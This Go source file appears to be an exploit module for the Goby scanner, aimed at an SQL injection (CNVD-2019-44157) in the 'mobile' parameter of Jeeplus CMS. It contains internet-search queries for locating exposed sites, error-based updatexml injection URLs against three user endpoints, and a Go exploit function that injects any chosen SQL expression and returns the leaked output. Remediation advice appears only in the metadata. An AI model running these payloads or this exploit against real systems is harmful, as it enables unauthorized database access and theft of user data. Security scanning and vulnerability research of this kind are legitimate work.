package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jeeplus CMS Mobile parameter SQL injection(CNVD-2019-44157)",
    "Description": "<p>Jeeplus is a quick development platform based on the code generator, which can help solve most of the duplicate work in the Java project and allow developers to pay more attention to business logic. Jeeplus supports single tables, the main tablet, one to one, one pair, many pairs, and the direct generation of the left tree, just simply configuration. The mobile parameters of Jeeplus/A/SYS/User/ResetPassword have SQL injection vulnerabilities, and attackers can obtain database permissions through this vulnerability.</p>",
    "Product": "jeeplus",
    "Homepage": "http://www.jeeplus.org/",
    "DisclosureDate": "2022-11-18",
    "Author": "2935900435@qq.com",
    "FofaQuery": "body=\"name=\\\"author\\\" content=\\\"http://www.jeeplus.org/\" || body=\"<meta name=\\\"author\\\" content=\\\"jeeplus\\\">\" || title=\"Jeeplus vue快速开发平台\" || (body=\"jeeplus.js\" && body=\"/static/common/\") || title=\"JeePlus 快速开发平台\"",
    "GobyQuery": "body=\"name=\\\"author\\\" content=\\\"http://www.jeeplus.org/\" || body=\"<meta name=\\\"author\\\" content=\\\"jeeplus\\\">\" || title=\"Jeeplus vue快速开发平台\" || (body=\"jeeplus.js\" && body=\"/static/common/\") || title=\"JeePlus 快速开发平台\"",
    "Level": "2",
    "Impact": "<p>In addition to the attacker, you can use SQL to inject vulnerabilities to obtain information in the database (for example, the administrator's background password and the user's personal information of the site), and even a Trojan horse can be written to the server at a high authority to further obtain the server system permissions.</p>",
    "Recommendation": "<p>1.Using precompiled statements, all query statements use the parameterized query interface provided by the database, and parameterized statements use parameters instead of embedding user input variables into SQL statements. Almost all current database systems provide a parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.</p><p>2.Escape or encode the special characters ('\"&amp;lt;&amp;gt;&amp;amp;*; etc.) entering the database.</p><p>3.Confirm the type of each data. For example, the data of the digital type must be a number, and the storage field in the database must correspond to the int type.</p><p>4.Filter dangerous characters, for example, use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate the operation if they match.</p><p>5. Please pay attention to the manufacturer's homepage in time: <a href=\"http://www.jeeplus.org/store/detail?\">http://www.jeeplus.org/store/detail?</a> ID = 2d4dd3e96e53456dbc5F34B9C0F98DEF</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "user(),database(),version()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1))%23",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "java.sql.SQLException:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/a/sys/user/validateMobileExist?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1))%23",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "java.sql.SQLException:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/a/sys/user/validateMobile?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1))#",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "java.sql.SQLException:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20{{{exp}}}),0x7e),1))%23",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "java.sql.SQLException",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "return|lastbody|regex|\\'\\~(.*?)\\~\\'",
                "output|lastbody|text|result: {{{return}}}"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/a/sys/user/validateMobileExist?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20{{{exp}}}),0x7e),1))%23",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "return|lastbody|regex|"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/a/sys/user/validateMobile?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20{{{exp}}}),0x7e),1))#",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2019-44157"
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "jeeplus CMS mobile参数 SQL注入(CNVD-2019-44157)",
            "Product": "jeeplus",
            "Description": "<p>JeePlus是一款基于代码生成器的javaEE快速开发平台，可以帮助解决java项目中绝大部分的的重复工作，让开发者更多关注业务逻辑。Jeeplus支持单表，主附表，一对一，一对多，多对多，左树右表的直接生成，只需简单配置。JeePlus /a/sys/user/resetPassword处mobile参数存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。<br></p>",
            "Recommendation": "<p>请关注厂商主页及时更新：1、使用预编译语句，所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p><p>2、对进入数据库的特殊字符（’”&amp;lt;&amp;gt;&amp;amp;*;等）进行转义处理，或编码转换。</p><p>3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>4、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><p>5、请关注厂商主页及时更新：<a href=\"http://www.jeeplus.org/#/store/detail?id=2d4dd3e96e53456dbc5f34b9c0f98def\">http://www.jeeplus.org/#/store/detail?id=2d4dd3e96e53456dbc5f34b9c0f98def</a><span style=\"color: rgb(45, 46, 47); font-size: 14px;\"></span></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Jeeplus CMS Mobile parameter SQL injection(CNVD-2019-44157)",
            "Product": "jeeplus",
            "Description": "<p>Jeeplus is a quick development platform based on the code generator, which can help solve most of the duplicate work in the Java project and allow developers to pay more attention to business logic. Jeeplus supports single tables, the main tablet, one to one, one pair, many pairs, and the direct generation of the left tree, just simply configuration. The mobile parameters of Jeeplus/A/SYS/User/ResetPassword have SQL injection vulnerabilities, and attackers can obtain database permissions through this vulnerability.<br></p>",
            "Recommendation": "<p>1.Using precompiled statements, all query statements use the parameterized query interface provided by the database, and parameterized statements use parameters instead of embedding user input variables into SQL statements. Almost all current database systems provide a parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.</p><p>2.Escape or encode the special characters ('\"&amp;lt;&amp;gt;&amp;amp;*; etc.) entering the database.</p><p>3.Confirm the type of each data. For example, the data of the digital type must be a number, and the storage field in the database must correspond to the int type.</p><p>4.Filter dangerous characters, for example, use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate the operation if they match.</p><p>5. Please pay attention to the manufacturer's homepage in time: <a href=\"http://www.jeeplus.org/store/detail?\">http://www.jeeplus.org/store/detail?</a> ID = 2d4dd3e96e53456dbc5F34B9C0F98DEF<br></p>",
            "Impact": "<p>In addition to the attacker, you can use SQL to inject vulnerabilities to obtain information in the database (for example, the administrator's background password and the user's personal information of the site), and even a Trojan horse can be written to the server at a high authority to further obtain the server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sql"].(string)
			uri := "/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20" + cmd + "),0x7e),1))%23"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "java.sql.SQLException") {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			uri2 := "/a/sys/user/validateMobileExist?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20" + cmd + "),0x7e),1))%23"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "java.sql.SQLException") {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}
			}
			uri3 := "/a/sys/user/validateMobile?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20" + cmd + "),0x7e),1))#"
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.FollowRedirect = false
			if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
				if resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "java.sql.SQLException") {
					expResult.Output = resp3.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
